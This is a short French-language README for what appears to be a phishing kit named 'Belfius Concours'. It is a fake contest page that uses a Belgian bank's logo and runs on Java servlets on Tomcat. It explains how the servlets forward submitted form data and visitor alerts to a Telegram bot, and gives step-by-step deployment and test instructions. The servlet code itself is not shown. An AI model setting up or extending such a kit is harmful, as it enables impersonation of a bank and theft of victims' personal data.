Belfius Concours - Version Java (Servlets)

Contenu:
- index.html / style.css / script.js / thankyou.html / images/logo.png
  -> Front déjà prêt
- java/TelegramHandlerServlet.java
  -> Reçoit le formulaire (action="telegram-handler"), envoie les infos au bot Telegram
- java/VisitLogServlet.java
  -> Reçoit l'appel JS (fetch('visit-log')), envoie une notif "new visitor" au bot Telegram

Comment utiliser:
1. Crée un projet Web Java (Tomcat, etc.).
2. Copie les fichiers de /java dans src/main/java/com/example/belfius/ (ou adapte le package).
3. Copie index.html, style.css, script.js, thankyou.html et le dossier images dans src/main/webapp.
4. Lance le serveur (Tomcat) et ouvre la page index.html.
5. Vérifie:
   - Ouverture page -> message "Nouveau visiteur..." dans ton bot Telegram.
   - Envoi du formulaire -> message "Nouveau formulaire..." avec IP + numéro lead.
